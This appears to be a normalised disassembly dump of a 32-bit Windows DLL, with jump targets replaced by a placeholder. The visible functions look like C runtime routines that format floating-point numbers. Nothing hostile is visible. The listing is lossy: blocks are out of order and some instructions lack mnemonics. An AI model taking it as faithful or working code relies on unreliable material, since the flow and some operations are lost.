cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000fb58
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_1000fbda
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_1000fbf6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_10010895
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_100107ed
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_1000fc52
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_10006230
inc eax
push eax
push esi
add esi edi
push esi
call sub_10005dd0
add esp 0x10
sub_1000fc97
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_100056cc
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_10007892
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_10007892
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_1000fc52
pop esi
mov [ eax ] esi
call sub_10007840
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100077ee
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_10007d33
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_10005dd0
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_1000fdf8
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10010aa3
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_10007892
mov [ eax ] ebx
call sub_10007840
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_1000fc97
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_1001093d
add esp 0x10
test eax eax
je r-xdata
sub_1000febf
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000fdf8
add esp 0x18
pop ebp
retn
sub_1000fedf
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_100056cc
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_10007892
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_10007892
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_10007840
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_1000febf
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_100107c0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10010c20
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10010c20
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_10005100
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_10010c20
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_10010b40
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_10010b40
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_10010b40
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_10010255
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_100056cc
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
call sub_10007840
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_10006230
inc eax
push eax
push esi
push ebx
call sub_10005dd0
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_10006230
inc eax
push eax
push esi
push ebx
call sub_10005dd0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_1000fc52
push edi
push 0x30
push ebx
call sub_10005100
add esp 0xc
sub_10010358
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10010aa3
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_10007892
mov [ eax ] esi
call sub_10007840
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_10007892
mov [ eax ] esi
call sub_10007840
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008edb
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1001093d
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_10010255
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_10010419
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10010aa3
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_10007892
mov [ eax ] edi
call sub_10007840
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008edb
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1001093d
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000fc97
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_10010255
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_10010506
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000fdf8
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10010358
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000fedf
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10010419
jmp r-xdata
sub_1001058e
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10010506
add esp 0x1c
pop ebp
retn
sub_100105b1
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_10010c3f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_100077ee
sub_100105d9
call sub_1000e91b
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1000e928
pop ecx
push 0x3
call sub_1000ae0a
int3
push 0x1
push 0x40000015
push 0x3
call sub_100076c5
add esp 0xc
sub_1001060c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_100056cc
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_10007892
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1000bae9
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_1000a5cf
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10008e78
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10010721
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001060c
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_10010750
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_100107c0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_100107ed
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_100056cc
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10011740
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10010c9e
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
sub_10010895
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_100056cc
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10011740
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_100111ef
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
sub_1001093d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_10007892
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_10007840
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_10006230
inc eax
push eax
push edi
push esi
call sub_10005dd0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_100109f0
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
